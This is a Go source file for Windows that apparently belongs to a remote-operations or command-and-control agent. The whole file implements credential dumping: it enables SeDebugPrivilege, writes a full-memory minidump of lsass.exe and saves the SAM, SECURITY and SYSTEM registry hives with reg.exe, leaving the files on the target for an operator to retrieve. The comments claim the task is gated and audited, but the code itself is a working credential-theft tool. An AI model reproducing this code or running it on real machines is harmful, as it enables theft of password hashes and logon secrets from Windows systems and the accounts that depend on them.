//go:build windows

package credential

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const miniDumpWithFullMemory = 0x00000002

var (
	modDbghelp            = windows.NewLazySystemDLL("dbghelp.dll")
	procMiniDumpWriteDump = modDbghelp.NewProc("MiniDumpWriteDump")
)

// Dump writes a credential-bearing artifact for offline analysis:
//   - "lsass": a full-memory minidump of lsass.exe
//   - "sam", "security", "system": a registry hive saved with reg.exe
//
// The file is left on the target; the operator retrieves it with the chunked
// download tasks. The task is credential-gated and audited at submission.
func Dump(kind string) (DumpResult, error) {
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case "lsass":
		return dumpLSASS()
	case "sam", "security", "system":
		return dumpHive(strings.ToLower(strings.TrimSpace(kind)))
	default:
		return DumpResult{}, fmt.Errorf("unsupported dump kind %q (want lsass, sam, security, or system)", kind)
	}
}

func dumpLSASS() (DumpResult, error) {
	note := ""
	if err := enableDebugPrivilege(); err != nil {
		note = "could not enable SeDebugPrivilege: " + err.Error()
	}

	pid, err := findProcess("lsass.exe")
	if err != nil {
		return DumpResult{}, err
	}

	h, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, uint32(pid))
	if err != nil {
		return DumpResult{}, fmt.Errorf("opening lsass.exe (PID %d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	path := filepath.Join(os.TempDir(), fmt.Sprintf("pc2-lsass-%d.dmp", time.Now().Unix()))
	f, err := os.Create(path)
	if err != nil {
		return DumpResult{}, err
	}
	defer f.Close()

	ret, _, callErr := procMiniDumpWriteDump.Call(
		uintptr(h),
		uintptr(pid),
		f.Fd(),
		uintptr(miniDumpWithFullMemory),
		0, 0, 0,
	)
	if ret == 0 {
		_ = os.Remove(path)
		return DumpResult{}, fmt.Errorf("MiniDumpWriteDump: %w", callErr)
	}
	if err := f.Sync(); err != nil {
		return DumpResult{}, err
	}

	result, err := describeDump("lsass", path)
	if err != nil {
		return DumpResult{}, err
	}
	result.Note = note
	return result, nil
}

func dumpHive(kind string) (DumpResult, error) {
	hive := `HKLM\` + strings.ToUpper(kind)
	path := filepath.Join(os.TempDir(), fmt.Sprintf("pc2-%s-%d.hive", kind, time.Now().Unix()))

	out, err := exec.Command("reg.exe", "save", hive, path, "/y").CombinedOutput()
	if err != nil {
		return DumpResult{}, fmt.Errorf("reg save %s: %v: %s", hive, err, strings.TrimSpace(string(out)))
	}
	return describeDump(kind, path)
}

func describeDump(kind, path string) (DumpResult, error) {
	info, err := os.Stat(path)
	if err != nil {
		return DumpResult{}, err
	}
	digest, err := digestFile(path)
	if err != nil {
		return DumpResult{}, err
	}
	return DumpResult{Kind: kind, Path: path, Size: info.Size(), SHA256: digest}, nil
}

func digestFile(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

func enableDebugPrivilege() error {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &tok); err != nil {
		return err
	}
	defer tok.Close()

	name, err := windows.UTF16PtrFromString("SeDebugPrivilege")
	if err != nil {
		return err
	}
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, name, &luid); err != nil {
		return err
	}

	tp := windows.Tokenprivileges{PrivilegeCount: 1}
	tp.Privileges[0] = windows.LUIDAndAttributes{
		Luid:       luid,
		Attributes: windows.SE_PRIVILEGE_ENABLED,
	}
	return windows.AdjustTokenPrivileges(tok, false, &tp, 0, nil, nil)
}

func findProcess(name string) (int, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("process snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err := windows.Process32First(snap, &entry); err != nil {
		return 0, fmt.Errorf("process snapshot first entry: %w", err)
	}
	for {
		if strings.EqualFold(windows.UTF16ToString(entry.ExeFile[:]), name) {
			return int(entry.ProcessID), nil
		}
		if err := windows.Process32Next(snap, &entry); err != nil {
			break
		}
	}
	return 0, fmt.Errorf("process %s not found", name)
}
